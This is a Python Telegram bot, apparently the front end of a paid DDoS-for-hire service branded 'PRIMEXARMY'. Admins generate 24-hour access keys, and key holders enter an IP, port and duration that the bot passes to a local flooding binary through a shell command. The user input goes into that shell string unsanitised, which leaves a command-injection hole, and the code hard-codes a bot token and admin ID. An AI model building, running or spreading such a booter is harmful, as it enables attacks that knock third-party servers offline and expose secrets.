import os, time, json, random, string, telebot, datetime, subprocess
from telebot import types

# --- [ CONFIG ] ---
TOKEN = '8407144258:AAH1-35hFhET77GTrnmuUCzqI7AMyhRKAZM'
bot = telebot.TeleBot(TOKEN)
ADMIN_ID = "7654106169" 
USER_FILE, KEY_FILE = "users.json", "keys.json"

def load_data():
    if not os.path.exists(USER_FILE): json.dump({}, open(USER_FILE, "w"))
    if not os.path.exists(KEY_FILE): json.dump({}, open(KEY_FILE, "w"))

def print_banner():
    os.system('clear')
    banner = f"""\033[91m
  ██████╗ ██████╗ ██╗███╗   ███╗███████╗██╗  ██╗
  ██╔══██╗██╔══██╗██║████╗ ████║██╔════╝╚██╗██╔╝
  ██████╔╝██████╔╝██║██╔████╔██║█████╗   ╚███╔╝ 
  ██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝   ██╔██╗ 
  ██║     ██║  ██║██║██║ ╚═╝ ██║███████╗██╔╝ ██╗
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
\033[93m            P R I M E X A R M Y  O F F I C I A L
\033[92m  [+] SERVER STATUS: ONLINE | ADMIN ID: {ADMIN_ID}
\033[0m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    print(banner)

@bot.message_handler(commands=['start'])
def start(m):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add("🚀 Attack", "👤 My Info", "🎟️ Redeem Key")
    bot.reply_to(m, "⚡ *PRIMEXARMY OFFICIAL* ⚡\nChoose an option:", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🚀 Attack")
def attack_req(m):
    users = json.load(open(USER_FILE))
    if str(m.chat.id) != ADMIN_ID and str(m.chat.id) not in users:
        bot.reply_to(m, "❌ Access Denied! Contact @PK_CHOPRA")
        return
    msg = bot.reply_to(m, "🎯 *Enter IP Port Time* (e.g., `1.1.1.1 8080 60`)")
    bot.register_next_step_handler(msg, run_atk)

def run_atk(m):
    try:
        ip, port, duration = m.text.split()
        bot.reply_to(m, f"🦅 *STRIKE STARTED*\n🎯 Target: `{ip}:{port}`\n⏳ Time: `{duration}s`", parse_mode='Markdown')
        subprocess.Popen(f"./PRIMEXARMY {ip} {port} {duration} 300", shell=True)
    except: bot.reply_to(m, "❗ Invalid Format!")

@bot.message_handler(commands=['genkey'])
def gen(m):
    if str(m.chat.id) != ADMIN_ID: return
    key = "PRIME-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    k = json.load(open(KEY_FILE)); k[key] = 24; json.dump(k, open(KEY_FILE, "w"))
    bot.reply_to(m, f"🔑 Key: `{key}` (24h)", parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🎟️ Redeem Key")
def redeem(m):
    msg = bot.reply_to(m, "Send Key:")
    bot.register_next_step_handler(msg, do_red)

def do_red(m):
    k, u = json.load(open(KEY_FILE)), json.load(open(USER_FILE))
    if m.text in k:
        exp = datetime.datetime.now() + datetime.timedelta(hours=k[m.text])
        u[str(m.chat.id)] = exp.strftime('%Y-%m-%d %H:%M:%S')
        json.dump(u, open(USER_FILE, "w")); del k[m.text]; json.dump(k, open(KEY_FILE, "w"))
        bot.reply_to(m, "✅ Access Granted!")
    else: bot.reply_to(m, "❌ Invalid Key!")

if __name__ == "__main__":
    load_data(); print_banner(); bot.polling(none_stop=True)